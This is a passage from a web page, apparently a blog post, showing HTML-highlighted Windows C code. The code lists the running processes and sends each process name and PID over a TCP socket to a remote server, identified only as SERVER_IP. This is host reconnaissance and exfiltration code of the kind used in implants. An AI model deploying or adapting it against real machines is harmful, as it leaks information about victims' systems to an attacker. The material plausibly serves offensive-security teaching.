                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetModuleBaseName</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">wcProc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wcProc</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">)))</span> <span class="p">{</span>
                        <span class="n">printf</span><span class="p">(</span><span class="s">"GetModuleBaseName failed with error %d, PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">(),</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">else</span> <span class="p">{</span>
                        <span class="n">snprintf</span><span class="p">(</span><span class="n">sendbuf</span><span class="p">,</span> <span class="n">DEFAULT_BUFLEN</span><span class="p">,</span> <span class="s">"[+] Process %ls, With PID %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wcProc</span><span class="p">,</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                        <span class="n">iResult</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">,</span> <span class="n">sendbuf</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">sendbuf</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">printf</span><span class="p">(</span><span class="s">"send failed with error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WSAGetLastError</span><span class="p">());</span>
                            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">WSADATA</span> <span class="n">wsaData</span><span class="p">;</span>
    <span class="n">SOCKET</span> <span class="n">ConnectSocket</span> <span class="o">=</span> <span class="n">INVALID_SOCKET</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">addrinfo</span><span class="o">*</span> <span class="n">result</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span> <span class="n">ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">addrinfo</span> <span class="n">hints</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">iResult</span><span class="p">;</span>

    <span class="c1">// Initialize Winsock</span>
    <span class="n">iResult</span> <span class="o">=</span> <span class="n">WSAStartup</span><span class="p">(</span><span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">wsaData</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"WSAStartup failed with error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">iResult</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">hints</span><span class="p">));</span>
    <span class="n">hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
    <span class="n">hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
    <span class="n">hints</span><span class="p">.</span><span class="n">ai_protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>

    <span class="n">iResult</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="n">SERVER_IP</span><span class="p">,</span> <span class="n">DEFAULT_PORT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">result</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"getaddrinfo failed with error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">iResult</span><span class="p">);</span>
        <span class="n">WSACleanup</span><span class="p">();</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Create a SOCKET for connecting to server</span>
        <span class="n">ConnectSocket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ConnectSocket</span> <span class="o">==</span> <span class="n">INVALID_SOCKET</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"socket failed with error: %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WSAGetLastError</span><span class="p">());</span>
            <span class="n">WSACleanup</span><span class="p">();</span>
            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Connect to server</span>
        <span class="n">iResult</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">,</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">closesocket</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">);</span>
            <span class="n">ConnectSocket</span> <span class="o">=</span> <span class="n">INVALID_SOCKET</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ConnectSocket</span> <span class="o">==</span> <span class="n">INVALID_SOCKET</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to connect to server!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">WSACleanup</span><span class="p">();</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Send the processes information</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SendProcessesInfo</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to send processes information.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Shutdown the connection since no more data will be sent</span>
    <span class="n">iResult</span> <span class="o">=</span> <span class="n">shutdown</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">,</span> <span class="n">SD_SEND</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"shutdown failed with error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WSAGetLastError</span><span class="p">());</span>
        <span class="n">closesocket</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">);</span>
        <span class="n">WSACleanup</span><span class="p">();</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// cleanup</span>
    <span class="n">closesocket</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">);</span>
    <span class="n">WSACleanup</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>